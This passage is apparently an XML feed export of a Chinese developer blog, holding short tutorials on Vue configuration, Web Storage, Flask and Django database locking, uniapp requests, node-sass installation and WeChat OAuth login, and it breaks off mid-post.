[&apos;5555&apos;, &apos;&apos;]</span><br><span class="line">    # conditions.addCondition(&apos;phoneType&apos;, phoneType, OptType.OR)</span><br><span class="line">    # conditions.addCondition(AppConditions.TAG, tags, OptType.AND)</span><br><span class="line">    message.setConditions(conditions)</span><br><span class="line">    # message.phoneTypeList.extend([&quot;ANDROID&quot;, &quot;IOS&quot;])</span><br><span class="line">    # message.provinceList.extend([&quot;浙江&quot;, &quot;上海&quot;])</span><br><span class="line">    # message.tagList.extend([&quot;开心&quot;])</span><br><span class="line">    # message.pushNetWorkType = 1</span><br><span class="line">    # 控速推送(条/秒)</span><br><span class="line">    # message.speed = 100</span><br><span class="line">    # ret = push.getPushResultByGroupName(APPID,GroupName)</span><br><span class="line">    ret = push.pushMessageToApp(message, &apos;toApp_任务别名_可为空&apos;)</span><br><span class="line">    # print (message.getSpeed())</span><br><span class="line">    print (ret)</span><br><span class="line"># 通知链接模板动作内容</span><br><span class="line">def LinkTemplateDemo():</span><br><span class="line">    template = LinkTemplate()</span><br><span class="line">    template.appId = APPID</span><br><span class="line">    template.appKey = APPKEY</span><br><span class="line">    template.title = &quot;请填入通知标题&quot;</span><br><span class="line">    template.text = &quot;请填入通知内容&quot;</span><br><span class="line">    template.logo = &quot;&quot;</span><br><span class="line">    template.url = &quot;http://www.baidu.com&quot;</span><br><span class="line">    template.transmissionType = 1</span><br><span class="line">    template.transmissionContent = &apos;&apos;</span><br><span class="line">    template.isRing = True</span><br><span class="line">    template.isVibrate = True</span><br><span class="line">    template.isClearable = True</span><br><span class="line">    return template</span><br><span class="line"></span><br><span class="line">`</span><br></pre></td></tr></table></figure>
<p>个推java、php、c#、node.js和python全部文档请见官网</p>
<p><a href="http://docs.getui.com/" target="_blank" rel="noopener">个推文档</a></p>
]]></content>
      <tags>
        <tag>个推</tag>
      </tags>
  </entry>
  <entry>
    <title>vue build构建的dist目录如何打开</title>
    <url>/2020/05/04/vue-10/</url>
    <content><![CDATA[<p>如何在本地打开vue构建的dist目录<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dist 目录需要启动一个HTTP服务器来访问</span><br><span class="line"></span><br><span class="line">npm install -g serve</span><br><span class="line"># -s 参数的意思是将其架设在 Single-Page Application 模式下</span><br><span class="line">serve -s dist</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>dist</tag>
      </tags>
  </entry>
  <entry>
    <title>vue中localStorage和sessionStorage使用方法</title>
    <url>/2020/05/04/vue-9/</url>
    <content><![CDATA[<p>localStorage和sessionStorage在vue中如何使用<br><a id="more"></a></p>
<h1 id="使用-Web-Storage-存储的优势"><a href="#使用-Web-Storage-存储的优势" class="headerlink" title="使用 Web Storage 存储的优势"></a>使用 Web Storage 存储的优势</h1><p>Web Storage键值对比存储 Cookie 方式更直观，而且容量更大，它包含两种：localStorage 和 sessionStorage</p>
<h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>sessionStorage（临时存储） ：关闭浏览器数据删除<br>localStorage（长期存储） ：数据一直存在，除非手动删除</p>
<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>这里 localStorage和sessionStorage的使用方法是一致的</p>
<p>localStorage.setItem(‘name’, “胡八一”); # 设置键值对，存储数据<br>注意value支持json格式</p>
<p>localStorage.getItem(‘name’); # 获取存储的数据</p>
<p>localStorage.removeItem(‘name’);  # 删除数据</p>
<p>监听数据变化<br>Storage 发生变化（增加、更新、删除）时的 触发，同一个页面发生的改变不会触发，只会监听同一域名下其他页面改变 Storage<br>window.addEventListener(‘storage’, function (e) {<br>　　console.log(‘key’, e.key); console.log(‘oldValue’, e.oldValue);<br>　　console.log(‘newValue’, e.newValue); console.log(‘url’, e.url);<br>})</p>
]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>localStorage</tag>
      </tags>
  </entry>
  <entry>
    <title>python flask 数据库乐观锁</title>
    <url>/2020/04/29/flask-5/</url>
    <content><![CDATA[<p>flask 乐观锁和悲观锁<br><a id="more"></a></p>
<p>对于处理数据库并发问题时，尤其是电商平台，很容易发生商品超卖的问题，因为两次或多次并发购买行为获取的库存时一致的。这导致商品发生超卖的现象，这里通常我们使用锁机制来控制，防止数据库高并发导致数据出现问题的现象。</p>
<h1 id="悲观锁"><a href="#悲观锁" class="headerlink" title="悲观锁"></a>悲观锁</h1><p>每次更新数据时可以限制数据库中某个表或者表中某个字段被多个线程修改</p>
<p>primary key和index都是走索引,导致行锁<br>其余都是表锁<br>不是全表扫描的都是行锁</p>
<p>select  math  from zje where math&gt;60 for update<br>表锁，悲观锁</p>
<p>select  math  from zje where id&gt;60 for update<br>行锁，悲观锁<br>悲观锁就是sql里面带有for update</p>
<p>django悲观锁</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 类视图 (并发，悲观锁)</span><br><span class="line">class MyView(View):</span><br><span class="line">    </span><br><span class="line">    @transaction.atomic</span><br><span class="line">    def post(self, request):</span><br><span class="line">        # select * from 表名 where id=1 for update;  </span><br><span class="line">        # for update 就表示锁,只有获取到锁才会执行查询,否则阻塞等待。</span><br><span class="line">        obj = 模型类名.objects.select_for_update().get(id=1)</span><br><span class="line">        </span><br><span class="line">        # 等事务提交后，会自动释放锁。</span><br><span class="line">        </span><br><span class="line">        return HttpResponse(&apos;ok&apos;)</span><br></pre></td></tr></table></figure>
<p>sqlalchemy使用悲观锁</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.session.Query(User).with_for_update().first()</span><br><span class="line"></span><br><span class="line">可用参数</span><br><span class="line">read</span><br><span class="line"></span><br><span class="line">    是标识加互斥锁还是共享锁. 当为 True 时, 即 for share 的语句, 是共享锁. 多个事务可以获取共享锁, 互斥锁只能一个事务获取. 有&quot;多个地方&quot;都希望是&quot;这段时间我获取的数据不能被修改, 我也不会改&quot;, 那么只能使用共享锁. </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nowait</span><br><span class="line"></span><br><span class="line">其它事务碰到锁, 是否不等待直接”报错”.</span><br><span class="line"></span><br><span class="line">of</span><br><span class="line"></span><br><span class="line">指明上锁的表, 如果不指明, 则查询中涉及的所有表(行)都会加锁.</span><br></pre></td></tr></table></figure>
<p>需要注意的是 read、nowait和of参数不支持mysql<br>功能|支持的数据库<br>|-|-|<br>FOR UPDATE NOWAIT    |Oracle and Postgresql<br>FOR SHARE    |Postgresql<br>FOR UPDATE OF    |PostgreSQL and Oracle</p>
<p>mysql 不支持这几个参数，转成sql都是:<br>SELECT users.id AS users_id FROM users FOR UPDATE</p>
<h1 id="乐观锁"><a href="#乐观锁" class="headerlink" title="乐观锁"></a>乐观锁</h1><p>乐观锁是在提交更新时判断是否库存和之前的有变化，有变化则失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">django例子</span><br><span class="line"></span><br><span class="line">GoodsSKU.objects.filter(id=1, stock=orgin_stock).update(stock=new_stock, sales=new_sales)</span><br></pre></td></tr></table></figure>
<p>mysql默认的是Repeatable read，那么你将不能读取其他事务是否提交了新的数据更新，所以你需要更改为Read committed——读取所有已提交的数据。</p>
<p>修改办法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /etc/mysql/mysql.conf.d  </span><br><span class="line">vim mysqld.cnf</span><br><span class="line">transaction-isolation=READ-COMMITED</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Serializable 串行化，一个事务一个事务的执行</span><br><span class="line"> </span><br><span class="line">Repeatable read 可重复读，无论其他事务是否修改并提交了数据，在这个事务中看到的数据值始终不受其他事务影响</span><br><span class="line"> </span><br><span class="line">Read committed 读取已提交，其他事务提交了对数据的修改后，本事务就能读取到修改后的数据值</span><br><span class="line"> </span><br><span class="line">Read uncommitted 读取为提交，其他事务只要修改了数据，即使未提交，本事务也能看到修改后的数据值。</span><br></pre></td></tr></table></figure>
<h1 id="悲观锁和乐观锁使用场景"><a href="#悲观锁和乐观锁使用场景" class="headerlink" title="悲观锁和乐观锁使用场景"></a>悲观锁和乐观锁使用场景</h1><p>悲观锁|写入频繁<br>|-|-|<br>乐观锁|读取频繁</p>
<p>在并发比较少时建议使用乐观锁,减少加锁、释放锁的开销。在并发比较高的时候，建议使用悲观锁。<br>如果乐观锁多次尝试的代价比较大，也建议使用悲观锁。</p>
<p>对于不是关键的数据读取时不要加锁，不要乱用<code>with_for_update()</code></p>
<p>使用<code>with_for_update()</code>如果有事务正在更新，另一个事务只能等待</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/17/flask-emoji/">flask如何在mysql中储存emoji表情</a></li><li><a href="https://thelighter.github.io/2020/05/17/flask-http-https/">flask的http和https的重定向和https强制使用办法</a></li><li><a href="https://thelighter.github.io/2020/04/14/flask-4/">session和cookie的区别和相同点</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-3/">flask的session用法和常识</a></li><li><a href="https://thelighter.github.io/2020/04/13/flask-2/">flask常用配置，flask配置文件config.py</a></li></ul></div>]]></content>
      <categories>
        <category>flask</category>
      </categories>
      <tags>
        <tag>flask</tag>
      </tags>
  </entry>
  <entry>
    <title>vue配置文件config说明</title>
    <url>/2020/04/29/vue-8/</url>
    <content><![CDATA[<p>vue.config.js 文件解析<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">// const path = require(&apos;path&apos;);</span><br><span class="line">module.exports = &#123;</span><br><span class="line">  /** 区分打包环境与开发环境</span><br><span class="line">   * process.env.NODE_ENV===&apos;production&apos;  (打包环境)</span><br><span class="line">   * process.env.NODE_ENV===&apos;development&apos; (开发环境)</span><br><span class="line">   * baseUrl: process.env.NODE_ENV===&apos;production&apos;?&quot;https://xxx&quot;:&apos;&apos;,</span><br><span class="line">   */</span><br><span class="line">  // 项目部署的基础路径</span><br><span class="line">  // 我们默认假设你的应用将会部署在域名的根部,</span><br><span class="line">  // 例如 https://www.my-app.com/</span><br><span class="line">  // 如果你的应用部署在一个子路径下，那么你需要在这里</span><br><span class="line">  // 指定子路径。比如将你的应用部署在</span><br><span class="line">  // https://www.foobar.com/my-app/</span><br><span class="line">  // 那么将这个值改为 &apos;/my-app/&apos;</span><br><span class="line"> </span><br><span class="line">  //baseUrl: &apos;/&apos;,//vue-cli3.3以下版本使用</span><br><span class="line">  publicPath: &apos;/&apos;,//vue-cli3.3+新版本使用</span><br><span class="line"> </span><br><span class="line">  // 构建好的文件输出到哪里</span><br><span class="line">  outputDir: &quot;dist&quot;,</span><br><span class="line"> </span><br><span class="line">  // assetsDir: &quot;base&quot; //静态资源打包地址</span><br><span class="line"> </span><br><span class="line">  //以多页模式构建应用程序。</span><br><span class="line">  pages: undefined,</span><br><span class="line"> </span><br><span class="line">  // 是否在保存时使用‘eslint-loader’进行检查 // 有效值: true | false | &apos;error&apos;</span><br><span class="line">  // 当设置为‘error’时，检查出的错误会触发编译失败</span><br><span class="line">  lintOnSave: true,</span><br><span class="line"> </span><br><span class="line">  // 使用带有浏览器内编译器的完整构建版本,是否使用包含运行时编译器的 Vue 构建版本</span><br><span class="line">  runtimeCompiler: false,</span><br><span class="line"> </span><br><span class="line">  // babel-loader默认会跳过`node_modules`依赖. // 通过这个选项可以显示转译一个依赖</span><br><span class="line">  // 默认babel-loader忽略mode_modules，这里可增加例外的依赖包名</span><br><span class="line">  transpileDependencies: [],</span><br><span class="line"> </span><br><span class="line">  // 是否在构建生产包时生成 sourceMap 文件，false将提高构建速度  映射文件 打包时使用</span><br><span class="line">  productionSourceMap: false,</span><br><span class="line"> </span><br><span class="line">  // 调整内部的webpack配置.</span><br><span class="line">  // see https://github.com/vuejs/vue-cli/blob/dev/docs/webpack.md</span><br><span class="line">  chainWebpack: () =&gt; &#123; &#125;,</span><br><span class="line">  // chainWebpack: () =&gt; &#123;</span><br><span class="line">  //   // 删除懒加载模块的prefetch，降低带宽压力</span><br><span class="line">  //   // 而且预渲染时生成的prefetch标签是modern版本的，低版本浏览器是不需要的</span><br><span class="line">  //   //config.plugins.delete(&apos;prefetch&apos;);</span><br><span class="line">  //   //if(process.env.NODE_ENV === &apos;production&apos;) &#123;</span><br><span class="line">  //   // 为生产环境修改配置...process.env.NODE_ENV !== &apos;development&apos;</span><br><span class="line">  //   //&#125; else &#123;</span><br><span class="line">  //   // 为开发环境修改配置...</span><br><span class="line">  //   //&#125;</span><br><span class="line">  // &#125;,</span><br><span class="line">  configureWebpack: () =&gt; &#123; &#125;,</span><br><span class="line">  // configureWebpack: () =&gt; &#123;</span><br><span class="line">  // // 生产and测试环境</span><br><span class="line">  // let pluginsPro = [</span><br><span class="line">  //   new CompressionPlugin(&#123; //文件开启Gzip，也可以通过服务端(如：nginx)</span><br><span class="line">  //     filename: &apos;[path].gz[query]&apos;,</span><br><span class="line">  //     algorithm: &apos;gzip&apos;,</span><br><span class="line">  //     test: new RegExp(&apos;\\.(&apos; + [&apos;js&apos;, &apos;css&apos;].join(&apos;|&apos;) + &apos;)$&apos;),</span><br><span class="line">  //     threshold: 8192,</span><br><span class="line">  //     minRatio: 0.8,</span><br><span class="line">  //   &#125;),</span><br><span class="line">  //   new BundleAnalyzerPlugin(),</span><br><span class="line">  // ];</span><br><span class="line">  // //开发环境</span><br><span class="line">  // let pluginsDev = [</span><br><span class="line">  //   new vConsolePlugin(&#123;</span><br><span class="line">  //     filter: [], // 需要过滤的入口文件</span><br><span class="line">  //     enable: true // 发布代码前记得改回 false</span><br><span class="line">  //   &#125;),</span><br><span class="line">  // ];</span><br><span class="line">  // if (process.env.NODE_ENV === &apos;production&apos;) &#123; // 为生产环境修改配置...process.env.NODE_ENV !== &apos;development&apos;</span><br><span class="line">  //   config.plugins = [...config.plugins, ...pluginsPro];</span><br><span class="line">  // &#125; else &#123;</span><br><span class="line">  //   // 为开发环境修改配置...</span><br><span class="line">  //   config.plugins = [...config.plugins, ...pluginsDev];</span><br><span class="line">  // &#125;</span><br><span class="line">  // &#125;,</span><br><span class="line"> </span><br><span class="line">  // CSS 相关选项</span><br><span class="line">  css: &#123;</span><br><span class="line">    // 将组件内部的css提取到一个单独的css文件（只用在生产环境）</span><br><span class="line">    // 也可以是传递给 extract-text-webpack-plugin 的选项对象</span><br><span class="line">    // 是否使用css分离插件 ExtractTextPlugin，采用独立样式文件载入，不采用&lt;style&gt;方式内联至html文件中</span><br><span class="line">    extract: true,</span><br><span class="line"> </span><br><span class="line">    // 是否在构建css样式映射，false将提高构建速度</span><br><span class="line">    sourceMap: false,</span><br><span class="line"> </span><br><span class="line">    // css预设器配置项</span><br><span class="line">    loaderOptions: &#123;</span><br><span class="line">      //   sass: &#123;</span><br><span class="line">      //     data: &apos;&apos;//`@import &quot;@/assets/scss/mixin.scss&quot;;`</span><br><span class="line">      //   &#125;</span><br><span class="line">    &#125;,</span><br><span class="line"> </span><br><span class="line">    // 启用 CSS modules for all css / pre-processor files.</span><br><span class="line">    modules: false</span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  // 构建时开启多进程处理 babel 编译</span><br><span class="line">  //是否为 Babel 或 TypeScript 使用 thread-loader。</span><br><span class="line">  //该选项在系统的 CPU 有多于一个内核时自动启用，仅作用于生产构建，在适当的时候开启几个子进程去并发的执行压缩</span><br><span class="line">  parallel: require(&quot;os&quot;).cpus().length &gt; 1,</span><br><span class="line"> </span><br><span class="line">  // PWA 插件相关配置</span><br><span class="line">  // 单页插件相关配置 https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-pwa</span><br><span class="line">  pwa: &#123;&#125;,</span><br><span class="line"> </span><br><span class="line">  //vue3.0+</span><br><span class="line">  devServer: &#123;//跨域</span><br><span class="line">    open: process.platform === &quot;darwin&quot;,</span><br><span class="line">    //open: true, //配置自动启动浏览器</span><br><span class="line">    disableHostCheck: false,</span><br><span class="line">    host: &quot;0.0.0.0&quot;,</span><br><span class="line">    // host: &quot;0.0.0.0&quot; =&gt;</span><br><span class="line">    //   App running at:</span><br><span class="line">    // - Local:   http://localhost:8080/</span><br><span class="line">    // - Network: http://192.168.1.102:8080/</span><br><span class="line">    // host: &quot;127.0.0.1&quot;=&gt;</span><br><span class="line">    //   App running at:</span><br><span class="line">    // - Local:   http://127.0.0.1:8080/</span><br><span class="line">    // - Network: http://127.0.0.1:8080/</span><br><span class="line">    port: 8080,// 端口号</span><br><span class="line">    https: false,// true 配置之后可使用生成 https://localhost:8080/</span><br><span class="line">    hotOnly: false,// 热更新（webpack已实现了，这里false即可）</span><br><span class="line">    // proxy: null // 设置代理</span><br><span class="line">    proxy: &apos;http://localhost:8080&apos;   // 配置跨域处理,只设一个代理</span><br><span class="line">    //   proxy: &#123; //多个</span><br><span class="line">    //     // 配置跨域处理 可以设置多个</span><br><span class="line">    //     &apos;/api&apos;: &#123;</span><br><span class="line">    //       target: &apos;https://www.baidu.com/api&apos;,</span><br><span class="line">    //       ws: true,</span><br><span class="line">    //       changeOrigin: true</span><br><span class="line">    //     &#125;</span><br><span class="line">    //   &#125;</span><br><span class="line">    // before: app =&gt; &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line"> </span><br><span class="line">  // vue 2.0 设置跨域</span><br><span class="line">  // dev: &#123;</span><br><span class="line">  //   // proxyTable: &#123;</span><br><span class="line">  //   //     &apos;/api&apos;: &#123;</span><br><span class="line">  //   //         target: &apos;http://127.0.0.1:8080&apos;, // 目标地址</span><br><span class="line">  //   //         changeOrigin: true,</span><br><span class="line">  //   //         pathRewrite: &#123;</span><br><span class="line">  //   //             &apos;^/api&apos;: &apos;&apos; // 将目标地址变成这个</span><br><span class="line">  //   //         &#125;</span><br><span class="line">  //   //     &#125;</span><br><span class="line">  //   // &#125;,</span><br><span class="line">  // &#125;,</span><br><span class="line"> </span><br><span class="line">  // 是否启用dll webpack dll</span><br><span class="line">  // 关于dll只做简单解释 未附详细代码</span><br><span class="line">  // webpack.dll.conf.js</span><br><span class="line">  // 1、entry配置需要dll打包的库</span><br><span class="line">  // 2、module配置处理对应文件类型的loader</span><br><span class="line">  // 3、增加 webpack.DllPlugin插件</span><br><span class="line">  //    (1)、path:生成mainfest.json文件的绝对路径。mainfest.json里面的内容为所有被打包到dll.js文件模块id的映射。</span><br><span class="line">  //    (2)、name：webpack打包时mainfest.json包含的库的暴露出来的函数名名</span><br><span class="line">  //    (3)、contenxt(可选):引入manifest文件的context，默认为webpack的context</span><br><span class="line">  // dll: false,//配置好dll库，设置dll：true；可优化打包效率。减少打包时间，增加库缓存</span><br><span class="line"> </span><br><span class="line">  // 第三方插件配置</span><br><span class="line">  pluginOptions: &#123;&#125;,</span><br><span class="line">  // pluginOptions: &#123;</span><br><span class="line">  //   &apos;style-resources-loader&apos;: &#123;//https://github.com/yenshih/style-resources-loader</span><br><span class="line">  //     preProcessor: &apos;scss&apos;,//声明类型</span><br><span class="line">  //     &apos;patterns&apos;: [</span><br><span class="line">  //       //path.resolve(__dirname, &apos;./src/assets/scss/_common.scss&apos;),</span><br><span class="line">  //     ],</span><br><span class="line">  //     //injector: &apos;append&apos;</span><br><span class="line">  //   &#125;</span><br><span class="line">  // &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/26/vue-7/">vue字符串截取字符串str切片处理办法</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-6/">node-sass安装失败解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/25/vue-5/">vue项目一直运行 /sockjs-node/info?t= 解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/14/vue-4/">MVVM的理解和Vue的生命周期</a></li><li><a href="https://thelighter.github.io/2020/04/13/vue-3/">vue的Mixed Content：The page at ‘https://XXX’ was loaded over HTTPS, but requested an insecure</a></li></ul></div>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>uniapp的uni.request使用方法</title>
    <url>/2020/04/26/uniapp-2/</url>
    <content><![CDATA[<p>uniapp的网络请求方法<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uni.request(&#123;</span><br><span class="line">    url: &apos;https://www.example.com/request&apos;, //仅为示例，并非真实接口地址。</span><br><span class="line">    data: &#123;</span><br><span class="line">        name: &apos;name&apos;,</span><br><span class="line">        age: 18</span><br><span class="line">    &#125;,</span><br><span class="line">    header: &#123;</span><br><span class="line">        &apos;custom-header&apos;: &apos;hello&apos; //自定义请求头信息</span><br><span class="line">    &#125;,</span><br><span class="line">    success: function (res) &#123;</span><br><span class="line">        console.log(res.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>uniapp网络请求的get和post</p>
<p>对于 GET 方法，会将数据转换为 query string。例如 { name: ‘name’, age: 18 } 转换后的结果是 name=name&amp;age=18。<br>对于 POST 方法且 header[‘content-type’] 为 application/json 的数据，会进行 JSON 序列化。<br>对于 POST 方法且 header[‘content-type’] 为 application/x-www-form-urlencoded 的数据，会将数据转换为 query string。</p>
<p>请求的 header 中 content-type 默认为 application/json</p>
<h1 id="注意-post请求必须加header-‘content-type’"><a href="#注意-post请求必须加header-‘content-type’" class="headerlink" title="注意 post请求必须加header[‘content-type’]"></a>注意 post请求必须加header[‘content-type’]</h1><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/06/uniapp-3/">uniapp和HTML5+ app开启iOS13暗黑模式教程</a></li><li><a href="https://thelighter.github.io/2020/02/07/uniapp-1/">uniapp框架GitHub演示地址</a></li></ul></div>]]></content>
      <categories>
        <category>uniapp</category>
      </categories>
      <tags>
        <tag>uniapp</tag>
      </tags>
  </entry>
  <entry>
    <title>vue字符串截取字符串str切片处理办法</title>
    <url>/2020/04/26/vue-7/</url>
    <content><![CDATA[<p>vue字符串处理——slice、substring、substr<br><a id="more"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">let str = &apos;abcdef&apos;;</span><br><span class="line"></span><br><span class="line">str = str.slice(0);//返回整个字符串 abcdef</span><br><span class="line">str = str.substring(0);//返回整个字符串 abcdef</span><br><span class="line">str = str.substr(0);//返回整个字符串 abcdef</span><br><span class="line">// 使用一个参数</span><br><span class="line">str = str.slice(2);//截取第二个之后所有的字符 cdef</span><br><span class="line">str = str.substring(2);//截取第二个之后所有的字符 cdef</span><br><span class="line">str = str.substr(2);//截取第二个之后所有的字符 cdef</span><br><span class="line"> </span><br><span class="line">// 使用两个参数</span><br><span class="line">str = str.slice(2,4);//截取第二个到第四个之间的字符 cd</span><br><span class="line">str = str.substring(2,4);//截取第二个到第四个之间的字符 cd</span><br><span class="line">str = str.substr(2,4);//截取从第3个开始往后数4位之间的字符 cdef</span><br><span class="line"> </span><br><span class="line">// 使用两个负数</span><br><span class="line">str = str.slice(1,-3);//截取第二个到第四个之间的字符 bc</span><br><span class="line">str = str.substring(1,-3);//截取第二个到第四个之间的字符 a #负数转换为0</span><br><span class="line">str = str.substr(1,-3);//不能为负数，若强行传递负数，会被当成0处理 &apos; &apos; #负数转换为0</span><br></pre></td></tr></table></figure>
<p>vue使用slice比较好用，和python的字符串切片一样</p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/29/vue-8/">vue配置文件config说明</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-6/">node-sass安装失败解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/25/vue-5/">vue项目一直运行 /sockjs-node/info?t= 解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/14/vue-4/">MVVM的理解和Vue的生命周期</a></li><li><a href="https://thelighter.github.io/2020/04/13/vue-3/">vue的Mixed Content：The page at ‘https://XXX’ was loaded over HTTPS, but requested an insecure</a></li></ul></div>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>node-sass安装失败解决办法</title>
    <url>/2020/04/26/vue-6/</url>
    <content><![CDATA[<p>node-sass安装失败怎么办<br><a id="more"></a></p>
<p>安装node-sass时指定源</p>
<p><code>npm i node-sass --sass_binary_site=https://npm.taobao.org/mirrors/node-sass</code></p>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/04/29/vue-8/">vue配置文件config说明</a></li><li><a href="https://thelighter.github.io/2020/04/26/vue-7/">vue字符串截取字符串str切片处理办法</a></li><li><a href="https://thelighter.github.io/2020/04/25/vue-5/">vue项目一直运行 /sockjs-node/info?t= 解决办法</a></li><li><a href="https://thelighter.github.io/2020/04/14/vue-4/">MVVM的理解和Vue的生命周期</a></li><li><a href="https://thelighter.github.io/2020/04/13/vue-3/">vue的Mixed Content：The page at ‘https://XXX’ was loaded over HTTPS, but requested an insecure</a></li></ul></div>]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>微信公众号H5网页登录授权过程</title>
    <url>/2020/04/25/weixin-4/</url>
    <content><![CDATA[<p>微信公众号H5网页登录授权过程<br><a id="more"></a></p>
<h1 id="首先在微信客户端中链接（window-location-href）"><a href="#首先在微信客户端中链接（window-location-href）" class="headerlink" title="首先在微信客户端中链接（window.location.href）"></a>首先在微信客户端中链接（window.location.href）</h1><ul>
<li>注意分为静默和弹出的</li>
<li>域名一定要在微信公众号中进行绑定授权</li>
<li>redirect_uri是跳转之后重定向的url</li>
<li>appid 是你的微信公众号的id<br>scope为snsapi_base</li>
</ul>
<p><a href="https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx520c15f417810387&amp;redirect_uri=https%3A%2F%2Fchong.qq.com%2Fphp%2Findex.php%3Fd%3D%26c%3DwxAdapter%26m%3DmobileDeal%26showwxpaytitle%3D1%26vb2ctag%3D4_2030_5_1194_60&amp;response_type=code&amp;scope=snsapi_base&amp;state=123#wechat_redirect" target="_blank" rel="noopener">https://open.weixin.qq.com/connect/oauth2/authorize?appid=wx520c15f417810387&amp;redirect_uri=https%3A%2F%2Fchong.qq.com%2Fphp%2Findex.php%3Fd%3D%26c%3DwxAdapter%26m%3DmobileDeal%26showwxpaytitle%3D1%26vb2ctag%3D4_2030_5_1194_60&amp;response_type=code&amp;scope=snsapi_base&amp;state=123#wechat_redirect</a></p>
<p>scope为snsapi_userinfo</p>
<p><a href="https://open.weixin.qq.com/connect/oauth2/authorize?appid=wxf0e81c3bee622d60&amp;redirect_uri=http%3A%2F%2Fnba.bluewebgame.com%2Foauth_response.php&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=STATE#wechat_redirect" target="_blank" rel="noopener">https://open.weixin.qq.com/connect/oauth2/authorize?appid=wxf0e81c3bee622d60&amp;redirect_uri=http%3A%2F%2Fnba.bluewebgame.com%2Foauth_response.php&amp;response_type=code&amp;scope=snsapi_userinfo&amp;state=STATE#wechat_redirect</a></p>
<h2 id="静默授权和弹出授权"><a href="#静默授权和弹出授权" class="headerlink" title="静默授权和弹出授权"></a>静默授权和弹出授权</h2><p>以snsapi_base为scope发起的网页授权，是用来获取进入页面的用户的openid的，并且是静默授权并自动跳转到回调页的。用户感知的就是直接进入了回调页（往往是业务页面）</p>
<p>以snsapi_userinfo为scope发起的网页授权，是用来获取用户的基本信息的。但这种授权需要用户手动同意，并且由于用户同意过，所以无须关注，就可在授权后获取该用户的基本信息。</p>
<h2 id="这里需要注意"><a href="#这里需要注意" class="headerlink" title="这里需要注意"></a>这里需要注意</h2><ol>
<li><p>redirect_uri可以是你的后端的api，然后端获取code，进行access_token获取，然后再重定向到你的微信公众号页面，通过query带上openid或者token等登录的凭证</p>
</li>
<li><p>第二种可以redirect_uri是你的微信的页面，然后获取code，post给后端再返回token等登录凭证</p>
</li>
</ol>
<div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/05/10/weixin-7/">app、公众号网页和小程序实现用户账号统一</a></li><li><a href="https://thelighter.github.io/2020/05/10/weixin-6/">微信app登录教程</a></li><li><a href="https://thelighter.github.io/2020/05/10/weixin-5/">微信公众号网页jssdk使用方法</a></li><li><a href="https://thelighter.github.io/2020/02/13/weixin-1/">微信客服消息报错45015</a></li></ul></div>]]></content>
      <categories>
        <category>微信</category>
      </categories>
      <tags>
        <tag>微信</tag>
      </tags>
  </entry>
  <entry>
    <title>vue项目一直运行 /sockjs-node/info?t= 解决办法</title>
    <url>/2020/04/25/vue-5/</url>
    <content><![CDATA[<p>如题<br><a id="more"></a><br>首先 sockjs-node 是一个JavaScript库，提供跨浏览器JavaScript的API，创建了一个低延迟、全双工的浏览器和web服务器之间通信通道。</p>
<p>服务端：sockjs-node（<a href="https://github.com/sockjs/sockjs-node）" target="_blank" rel="noopener">https://github.com/sockjs/sockjs-node）</a><br>客户端：sockjs-clien（<a href="https://github.com/sockjs/sockjs-client）" target="_blank" rel="noopener">https://github.com/sockjs/sockjs-client）</a></p>
<p>如果你的项目没有用到 sockjs，vuecli3 运行 npm run serve 之后 network 里面一直调研一个接口：<a href="http://localhost:8080/sockjs-node/info?t=1462183700002" target="_blank" rel="noopener">http://localhost:8080/sockjs-node/info?t=1462183700002</a></p>
<p>作为一个有节操的程序猿，实在不能忍受，特意自己研究了下源码，从根源上关闭这个调用</p>
<ol>
<li><p>找到/node_modules/sockjs-client/dist/sockjs.js </p>
</li>
<li><p>找到代码的 1605行  </p>
